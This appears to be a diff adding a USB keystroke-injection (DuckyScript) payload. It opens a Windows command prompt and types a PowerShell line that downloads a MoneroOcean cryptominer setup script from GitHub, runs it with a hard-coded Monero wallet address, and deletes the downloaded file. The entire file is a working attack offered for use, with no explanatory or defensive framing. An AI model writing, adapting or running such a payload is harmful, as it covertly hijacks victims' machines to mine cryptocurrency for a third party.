@@ -1,0 +1,8 @@
+DELAY 600
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 1000
+STRING powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 87oF7aSdYoJ5DWyRvNJQcvi2m8hpCVghx1eHporfDdsjUpYYpb588fJEBxw2SbWa1dbQFPQCFXppGX2fdH9sbvCAHJiVUoD; Remove-Item -Force $tempfile"
+ENTER
